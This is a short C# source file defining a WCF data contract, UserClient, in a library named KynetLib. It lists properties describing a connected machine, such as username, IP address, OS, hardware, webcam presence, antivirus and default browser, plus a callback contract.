using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.ServiceModel;
using System.Runtime.Serialization;

namespace KynetLib
{
    [DataContract(Namespace = "Kynet")]
    public class UserClient
    {
        [DataMember]
        public string Username { get; set; }
        [DataMember]
        public string Machinename { get; set; }
        [DataMember]
        public string SessionID { get; set; }
        [DataMember]
        public string Fingerprint { get; set; }
        [DataMember]
        public string Domain { get; set; }
        [DataMember]
        public string IPAddress { get; set; }
        [DataMember]
        public string OperatingSystem { get; set; }
        [DataMember]
        public string Country { get; set; }

        [DataMember]
        public string SystemType { get; set; }
        [DataMember]
        public int MonitorCount { get; set; }
        [DataMember]
        public bool Webcam { get; set; }

        [DataMember]
        public string GPU { get; set; }
        [DataMember]
        public string CPU { get; set; }
        [DataMember]
        public int RAM { get; set; }
        [DataMember]
        public bool x64_Bit { get; set; }
        [DataMember]
        public string[] Harddrives { get; set; }

        [DataMember]
        public string AntiVirus { get; set; }
        [DataMember]
        public string DefaultBrowser { get; set; }

        [DataMember]
        public ICallbackContract callback { get; set; }
    }

}
